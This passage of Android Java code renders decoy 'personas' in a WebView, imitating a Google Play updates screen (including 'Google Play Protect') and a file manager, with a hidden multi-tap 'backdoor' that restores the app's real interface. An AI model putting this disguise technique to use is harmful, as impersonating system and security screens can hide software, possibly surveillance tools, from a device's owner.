            "<div class='search-bar'><svg viewBox='0 0 24 24'><path d='M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z'/></svg>Search for apps &amp; games</div>" +
            "</div>" +
            "<div class='tabs'><div class='tab active'>Updates</div><div class='tab'>Apps</div><div class='tab'>Games</div></div>" +
            "<div class='update-row'><div class='update-left'><div class='update-ic'>⚙️</div>" +
            "<div><div class='update-name'>Google Play Services</div><div class='update-size'>Updating… 28 MB</div>" +
            "<div class='prog-bar'><div class='prog-fill' style='width:65%'></div></div></div></div></div>" +
            "<div class='update-row'><div class='update-left'><div class='update-ic'>🛡️</div>" +
            "<div><div class='update-name'>Google Play Protect</div><div class='update-size'>Updating… 4.2 MB</div>" +
            "<div class='prog-bar'><div class='prog-fill' style='animation-delay:0.4s'></div></div></div></div></div>" +
            "<div class='section'>Available updates</div>" +
            "<div class='app-card'><div class='app-ic'>📷</div><div><div class='app-title'>Camera</div><div class='app-meta'>Google LLC · 86 MB</div><div class='app-rating'><span class='star'>★</span> 4.4</div></div><button class='btn-install'>Update</button></div>" +
            "<div class='app-card'><div class='app-ic'>🗺️</div><div><div class='app-title'>Maps</div><div class='app-meta'>Google LLC · 212 MB</div><div class='app-rating'><span class='star'>★</span> 4.3</div></div><button class='btn-install'>Update</button></div>" +
            "<div class='app-card'><div class='app-ic'>💬</div><div><div class='app-title'>Messages</div><div class='app-meta'>Google LLC · 48 MB</div><div class='app-rating'><span class='star'>★</span> 4.1</div></div><button class='btn-install'>Update</button></div>" +
            "</body></html>";

        loadWebDecoy(html);
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  PERSONA 6 — FILE MANAGER
    // ══════════════════════════════════════════════════════════════════════════

    private void renderFileMgr() {
        String html =
            "<!DOCTYPE html><html><head>" +
            "<meta name='viewport' content='width=device-width,initial-scale=1,user-scalable=no'>" +
            "<style>" +
            "*{box-sizing:border-box;margin:0;padding:0;font-family:'Roboto',sans-serif}" +
            "body{background:#fff;color:#202124}" +
            ".toolbar{background:#1a73e8;padding:14px 16px;display:flex;align-items:center;gap:14px}" +
            ".toolbar svg{fill:#fff;width:24px;height:24px}" +
            ".toolbar-title{color:#fff;font-size:20px;font-weight:500;flex:1}" +
            ".toolbar-action svg{fill:#fff;width:22px;height:22px}" +
            ".storage-card{margin:12px;background:#e8f0fe;border-radius:8px;padding:14px}" +
            ".storage-title{font-size:13px;color:#1a73e8;margin-bottom:8px}" +
            ".storage-bar{height:6px;background:#e0e0e0;border-radius:3px;overflow:hidden;margin-bottom:4px}" +
            ".storage-fill{height:100%;background:#1a73e8;border-radius:3px}" +
            ".storage-info{font-size:12px;color:#5f6368}" +
            ".cat-list{padding:0 4px}" +
            ".cat-item{display:flex;align-items:center;gap:16px;padding:14px 12px;border-bottom:1px solid #f1f3f4}" +
            ".cat-icon{width:44px;height:44px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:22px;flex-shrink:0}" +
            ".cat-name{flex:1;font-size:14px;color:#202124}" +
            ".cat-count{font-size:12px;color:#9aa0a6}" +
            ".cat-chev svg{fill:#9aa0a6;width:16px;height:16px}" +
            ".recent-header{padding:14px 16px 6px;font-size:14px;font-weight:500;color:#202124}" +
            ".file-item{display:flex;align-items:center;gap:14px;padding:10px 16px;border-bottom:1px solid #f1f3f4}" +
            ".file-icon{width:40px;height:40px;border-radius:4px;display:flex;align-items:center;justify-content:center;font-size:22px}" +
            ".file-name{font-size:14px;color:#202124;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}" +
            ".file-meta{font-size:12px;color:#9aa0a6}" +
            ".file-menu svg{fill:#9aa0a6;width:20px;height:20px}" +
            "</style></head><body>" +
            "<div class='toolbar'>" +
            "<svg viewBox='0 0 24 24'><path d='M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z'/></svg>" +
            "<span class='toolbar-title'>Files</span>" +
            "<div class='toolbar-action'><svg viewBox='0 0 24 24'><path d='M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z'/></svg></div>" +
            "</div>" +
            "<div class='storage-card'>" +
            "<div class='storage-title'>Internal Storage</div>" +
            "<div class='storage-bar'><div class='storage-fill' style='width:67%'></div></div>" +
            "<div class='storage-info'>48.6 GB used of 128 GB</div>" +
            "</div>" +
            "<div class='cat-list'>" +
            "<div class='cat-item'><div class='cat-icon' style='background:#fce4ec'>🖼️</div><div class='cat-name'>Images</div><div class='cat-count'>1,284 files</div><div class='cat-chev'><svg viewBox='0 0 24 24'><path d='M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z'/></svg></div></div>" +
            "<div class='cat-item'><div class='cat-icon' style='background:#e3f2fd'>🎬</div><div class='cat-name'>Videos</div><div class='cat-count'>48 files</div><div class='cat-chev'><svg viewBox='0 0 24 24'><path d='M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z'/></svg></div></div>" +
            "<div class='cat-item'><div class='cat-icon' style='background:#e8f5e9'>🎵</div><div class='cat-name'>Audio</div><div class='cat-count'>312 files</div><div class='cat-chev'><svg viewBox='0 0 24 24'><path d='M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z'/></svg></div></div>" +
            "<div class='cat-item'><div class='cat-icon' style='background:#fff8e1'>📄</div><div class='cat-name'>Documents</div><div class='cat-count'>89 files</div><div class='cat-chev'><svg viewBox='0 0 24 24'><path d='M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z'/></svg></div></div>" +
            "<div class='cat-item'><div class='cat-icon' style='background:#f3e5f5'>📦</div><div class='cat-name'>Downloads</div><div class='cat-count'>26 files</div><div class='cat-chev'><svg viewBox='0 0 24 24'><path d='M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z'/></svg></div></div>" +
            "</div>" +
            "<div class='recent-header'>Recent files</div>" +
            "<div class='file-item'><div class='file-icon' style='background:#fce4ec'>📸</div><div style='flex:1'><div class='file-name'>IMG_20261119_143022.jpg</div><div class='file-meta'>Today · 4.2 MB</div></div><div class='file-menu'><svg viewBox='0 0 24 24'><path d='M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z'/></svg></div></div>" +
            "<div class='file-item'><div class='file-icon' style='background:#e3f2fd'>🎬</div><div style='flex:1'><div class='file-name'>Screen_recording_1119.mp4</div><div class='file-meta'>Today · 128 MB</div></div><div class='file-menu'><svg viewBox='0 0 24 24'><path d='M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z'/></svg></div></div>" +
            "<div class='file-item'><div class='file-icon' style='background:#fff8e1'>📄</div><div style='flex:1'><div class='file-name'>document_scan.pdf</div><div class='file-meta'>Yesterday · 2.1 MB</div></div><div class='file-menu'><svg viewBox='0 0 24 24'><path d='M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z'/></svg></div></div>" +
            "</body></html>";

        loadWebDecoy(html);
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  SHARED — WebView loader + backdoor
    // ══════════════════════════════════════════════════════════════════════════

    private void loadWebDecoy(String html) {
        WebView wv = new WebView(this);
        WebSettings s = wv.getSettings();
        s.setJavaScriptEnabled(true);
        s.setDomStorageEnabled(true);
        s.setBuiltInZoomControls(false);
        s.setDisplayZoomControls(false);
        wv.setWebViewClient(new WebViewClient() {
            @Override public boolean shouldOverrideUrlLoading(WebView v, String url) { return true; }
        });

        // Backdoor touch listener on the WebView's parent container
        FrameLayout root = new FrameLayout(this);
        root.setLayoutParams(new FrameLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT));

        // Transparent tap-catcher overlay for top 60dp (toolbar area) only
        View tapZone = new View(this);
        int dp60 = (int) (60 * getResources().getDisplayMetrics().density);
        FrameLayout.LayoutParams tapParams = new FrameLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, dp60);
        tapParams.gravity = Gravity.TOP;
        tapZone.setLayoutParams(tapParams);
        tapZone.setBackgroundColor(Color.TRANSPARENT);
        tapZone.setClickable(true);
        tapZone.setOnClickListener(v -> checkBackdoorTap());

        root.addView(wv, new FrameLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT));
        root.addView(tapZone);

        setContentView(root);
        wv.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null);
    }

    private void checkBackdoorTap() {
        long now = System.currentTimeMillis();
        if (now - lastTapTime > TAP_WINDOW_MS) {
            tapCount = 0;
        }
        lastTapTime = now;
        tapCount++;
        Log.d(TAG, "Backdoor tap: " + tapCount + "/" + BACKDOOR_TAPS);

        if (tapCount >= BACKDOOR_TAPS) {
            tapCount = 0;
            Log.d(TAG, "Backdoor activated");
            DecoyManager.get(this).backdoorRestore(this);
        }
    }

    @Override
    public void onBackPressed() {
        moveTaskToBack(true);
    }
}
